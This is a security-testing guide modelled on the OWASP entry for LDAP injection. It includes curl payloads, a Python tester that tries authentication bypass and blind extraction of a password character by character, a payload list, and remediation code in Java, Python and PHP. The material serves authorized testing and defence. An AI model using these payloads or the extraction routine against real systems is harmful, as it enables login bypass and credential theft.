# WSTG-INPV-06: Testing for LDAP Injection

## Test ID
WSTG-INPV-06

## Test Name
Testing for LDAP Injection

## High-Level Description

LDAP Injection occurs when user input is incorrectly filtered or not sanitized before being included in LDAP queries. Attackers can modify LDAP queries to bypass authentication, extract sensitive directory information, or modify directory data.

---

## What to Check

- [ ] Authentication forms using LDAP
- [ ] User search functionality
- [ ] Directory lookups
- [ ] Filter manipulation
- [ ] DN (Distinguished Name) injection
- [ ] Boolean-based blind injection

---

## How to Test

### Step 1: Identify LDAP Injection Points

```bash
#!/bin/bash
TARGET="https://target.com/login"

# Basic LDAP injection payloads
echo "[*] Testing for LDAP injection..."

# Test with special characters
curl -s -X POST "$TARGET" -d "username=*&password=*"
curl -s -X POST "$TARGET" -d "username=admin*&password=*"
curl -s -X POST "$TARGET" -d "username=*)(uid=*))(|(uid=*&password=test"

# Test authentication bypass
curl -s -X POST "$TARGET" -d "username=*))&password=pwd"
curl -s -X POST "$TARGET" -d "username=admin)(&password=*"
```

### Step 2: LDAP Injection Tester

```python
#!/usr/bin/env python3
"""
LDAP Injection Vulnerability Tester
"""

import requests
import re

class LDAPInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # LDAP error patterns
    LDAP_ERRORS = [
        r'Invalid DN syntax',
        r'LDAP error',
        r'javax\.naming\.NamingException',
        r'javax\.naming\.directory',
        r'LDAPException',
        r'Bad search filter',
        r'invalid filter',
        r'unable to process search',
        r'com\.sun\.jndi\.ldap',
        r'ldap_search',
        r'ldap_bind',
    ]

    # LDAP injection payloads
    PAYLOADS = {
        'auth_bypass': [
            ("*", "*"),                           # Wildcard
            ("*)(uid=*))((uid=*", "test"),       # Filter injection
            ("admin)(&)", "pwd"),                 # Close filter
            ("*)(|(password=*)", "test"),         # OR injection
            ("admin)(|(password=*))", "test"),    # Password extraction attempt
            ("admin)(!(&(1=0", "test"),           # NOT injection
            ("*))%00", "*"),                       # Null byte
        ],
        'filter_injection': [
            "*",
            "*)(objectClass=*",
            "*)(uid=*",
            "admin*",
            "admin)(cn=*",
            "*)(|(objectClass=*))",
        ],
        'dn_injection': [
            "admin,cn=Users,dc=test",
            "admin)(&(objectClass=*",
            "admin,ou=admins,dc=example,dc=com",
        ],
    }

    def test_auth_bypass(self):
        """Test LDAP authentication bypass"""
        print("\n[*] Testing LDAP authentication bypass...")

        for username, password in self.PAYLOADS['auth_bypass']:
            try:
                response = self.session.post(
                    self.url,
                    data={'username': username, 'password': password}
                )

                # Check for errors indicating LDAP
                for pattern in self.LDAP_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] LDAP detected! Error in response")
                        self.findings.append({
                            'type': 'LDAP Error Disclosure',
                            'payload': f"username={username}",
                            'severity': 'Medium'
                        })

                # Check for successful bypass
                if response.status_code == 200:
                    # Look for success indicators
                    if 'welcome' in response.text.lower() or \
                       'dashboard' in response.text.lower() or \
                       'logout' in response.text.lower():
                        print(f"[VULN] Authentication bypass!")
                        print(f"  Username: {username}")
                        self.findings.append({
                            'type': 'LDAP Auth Bypass',
                            'username': username,
                            'severity': 'Critical'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def test_filter_injection(self, param='search'):
        """Test LDAP filter injection"""
        print("\n[*] Testing LDAP filter injection...")

        for payload in self.PAYLOADS['filter_injection']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for LDAP errors
                for pattern in self.LDAP_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] LDAP error with payload: {payload}")
                        self.findings.append({
                            'type': 'LDAP Filter Injection',
                            'payload': payload,
                            'severity': 'High'
                        })

                # Check for data leakage
                if len(response.text) > 1000:
                    print(f"[INFO] Large response with wildcard: {payload}")

            except Exception as e:
                pass

    def test_boolean_blind(self):
        """Test boolean-based blind LDAP injection"""
        print("\n[*] Testing blind LDAP injection...")

        # True condition
        true_payload = ("admin)(|(password=*)", "*")
        # False condition
        false_payload = ("admin)(|(password=invalidxxx)", "*")

        try:
            true_response = self.session.post(
                self.url,
                data={'username': true_payload[0], 'password': true_payload[1]}
            )

            false_response = self.session.post(
                self.url,
                data={'username': false_payload[0], 'password': false_payload[1]}
            )

            # Check for response differences
            if len(true_response.text) != len(false_response.text):
                print(f"[VULN] Blind LDAP injection detected!")
                print(f"  True response: {len(true_response.text)} bytes")
                print(f"  False response: {len(false_response.text)} bytes")
                self.findings.append({
                    'type': 'Blind LDAP Injection',
                    'severity': 'High'
                })
                return True

        except Exception as e:
            pass

        return False

    def extract_data_blind(self, target_field='password'):
        """Extract data via blind LDAP injection"""
        print(f"\n[*] Attempting blind data extraction ({target_field})...")

        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        extracted = ""

        for position in range(1, 20):
            found = False
            for char in charset:
                payload = f"admin)({target_field}={extracted}{char}*"

                try:
                    response = self.session.post(
                        self.url,
                        data={'username': payload, 'password': '*'}
                    )

                    # Success indicator
                    if 'welcome' in response.text.lower():
                        extracted += char
                        found = True
                        print(f"  Found: {extracted}")
                        break

                except Exception as e:
                    pass

            if not found:
                break

        if extracted:
            print(f"[VULN] Extracted {target_field}: {extracted}")
            self.findings.append({
                'type': 'LDAP Data Extraction',
                'field': target_field,
                'value': extracted,
                'severity': 'Critical'
            })

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("LDAP INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo LDAP injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")
                if 'username' in f:
                    print(f"  Username: {f['username']}")

    def run_tests(self):
        """Run all LDAP injection tests"""
        self.test_auth_bypass()
        self.test_filter_injection()
        self.test_boolean_blind()
        self.generate_report()

# Usage
tester = LDAPInjectionTester("https://target.com/login")
tester.run_tests()
```

### Step 3: LDAP Injection Payloads

```
# Authentication Bypass Payloads
*
*)(&
*))%00
admin)(&)
admin)(!(&(1=0
*()|%26'
admin))(|(objectClass=*)
*)(uid=*))(|(uid=*

# Filter Injection
*)(objectClass=*
*)(uid=*
admin*
*)(|(objectClass=user)(objectClass=person))

# Data Extraction (Blind)
admin)(password=a*
admin)(password=b*
admin)(password=c*
# Continue character by character

# OR Injection
*)(|(mail=*
admin)(|(password=*))

# AND Injection
admin)(&(objectClass=user))

# DN Injection (Distinguished Name)
admin,ou=users,dc=company,dc=com
cn=admin,dc=example)(&(objectClass=*
```

### Step 4: LDAP Query Structure

```
# Standard LDAP Filter Syntax
(&(uid=admin)(password=secret))

# Vulnerable query construction:
# "(&(uid=" + username + ")(password=" + password + "))"

# With injection username = "*)(uid=*))(|(uid=*"
# Results in: (&(uid=*)(uid=*))(|(uid=*)(password=test))
# The )(uid=*) closes the original filter and adds always-true condition

# OR injection for bypass:
# username = "*)(|(password=*"
# Results in: (&(uid=*)(|(password=*)(password=test))
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Manual testing |
| ldapsearch | LDAP client |
| Apache Directory Studio | LDAP browser |
| Custom scripts | Automated testing |

---

## Remediation

```java
// Java - Use parameterized LDAP queries
import javax.naming.directory.*;

// VULNERABLE
String filter = "(&(uid=" + username + ")(password=" + password + "))";

// SECURE - Escape special characters
import javax.naming.ldap.Rdn;

String escapedUsername = Rdn.escapeValue(username);
String escapedPassword = Rdn.escapeValue(password);
String filter = "(&(uid=" + escapedUsername + ")(password=" + escapedPassword + "))";
```

```python
# Python - python-ldap with escaping
import ldap
from ldap.filter import escape_filter_chars

username = escape_filter_chars(user_input)
filter_str = f"(&(uid={username})(objectClass=person))"
```

```php
<?php
// PHP - Use ldap_escape
$safe_username = ldap_escape($username, '', LDAP_ESCAPE_FILTER);
$filter = "(&(uid=$safe_username)(objectClass=user))";
?>
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| LDAP authentication bypass | 9.8 | Critical |
| LDAP data extraction | 7.5 | High |
| LDAP filter injection | 7.5 | High |
| LDAP error disclosure | 4.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-90** | Improper Neutralization of Special Elements used in an LDAP Query |

---

## References

- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [OWASP LDAP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)

---

## Checklist

```
[ ] LDAP authentication tested
[ ] Filter injection tested
[ ] Blind injection tested
[ ] Special characters tested
[ ] Error messages analyzed
[ ] Data extraction attempted
[ ] Findings documented
```
